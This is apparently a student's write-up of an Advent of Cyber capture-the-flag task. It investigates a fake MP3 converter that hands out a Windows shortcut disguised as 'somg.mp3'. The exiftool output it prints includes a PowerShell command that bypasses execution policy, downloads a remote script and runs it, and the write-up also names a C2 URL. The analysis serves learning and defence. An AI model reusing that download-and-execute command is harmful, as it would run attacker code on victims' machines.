
# Advent of Cyber

## Task 7:
This challenge required us to investigate a Youtube to MP3 converter site named “The Glitch’s All-in-one Converter” I started off by launching the Attack box and starting the virtual machine. I accessed the machine by typing 10.10.214.113 on the web browser. 

![alt text](<Pasted Graphic 22.png>)

On the website, I entered the YouTube video link provided in the description. I selected the MP3 format.
![alt text](<Format Selection Protocol.png>)

After this, I clicked on the download file option to download the MP3 file. A zip file was downloaded.

![alt text](<Pasted Graphic 24.png>)

I then looked for the zip file in the root directory and clicked on the extract to option in Edit menu to extract the contents of the zip file. Two files named song.mp3 and somg.mp3 were extracted.

![alt text](<Pasted Graphic 25.png>)

Then to determine their file type, I went to terminal and ran the commands `file song.mp3` and `file somg.mp3` to check their file type.
```
root@ip-10-10-129-168:~# file song.mp3
song.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
root@ip-10-10-129-168:~# file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
root@ip-10-10-129-168:~# 
```
root@ip-10-10-129-168:~# exiftool somg.mp3
ExifTool Version Number         : 11.88
File Name                       : somg.mp3
Directory                       : .
File Size                       : 2.1 kB
File Modification Date/Time     : 2024:10:30 14:32:52+00:00
File Access Date/Time           : 2024:12:05 12:18:02+00:00
File Inode Change Date/Time     : 2024:12:05 12:15:14+00:00
File Permissions                : rw-r--r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 08:14:14+01:00
Access Date                     : 2018:09:15 08:14:14+01:00
Modify Date                     : 2018:09:15 08:14:14+01:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
root@ip-10-10-129-168:~# 
```
I could see the powershell command being used on the above output. I opened the powershelgl script using the given url: https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1
```
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}
```
Here was a clue about the identity of the creator of the script, the initials M.M. I searched "Created by the one and only M.M." on GitHub and clicked on the issues column.

![alt text](<Pasted Graphic 26.png>)

Then I decided to take a look at the questions for this challenge. The first one was “Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? “ So I ran the command exiftool song.mp and noticed the name Tyler Ramsbey. 

Img

The next question was “The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?”. I clicked on the 3rd result in Issues on GitHub

![alt text](<Python Version of this #7.png>)
![alt text](<Pasted Graphic 28.png>)

Here, the url http://papash3ll.thm/data was written. 
Then the question was “Who is M.M? Maybe his Github profile page would provide clues?” I searched around GitHub, found the GitHub profile of M.M and got the name “Mayor Malware” from a repository on the profile. 

![alt text](<Pasted Graphic 29.png>)

The next question was “What is the number of commits on the GitHub repo where the issue was raised?”. So I checked the CryptoWallet-Search repo and found the number of commits to be 1.

![alt text](<Pasted Graphic 30.png>)
![alt text](<Pasted Graphic 31.png>)

-New concepts
	1.	I came across Powershell which is a command-line shell and scripting language o automate tasks and manage systems in Windows environments. The powershell script in here was designed to collect highly sensitive information and send it to an attacker's remote server.
	2.	I got a basic idea about OPSEC which stands for Operational Security
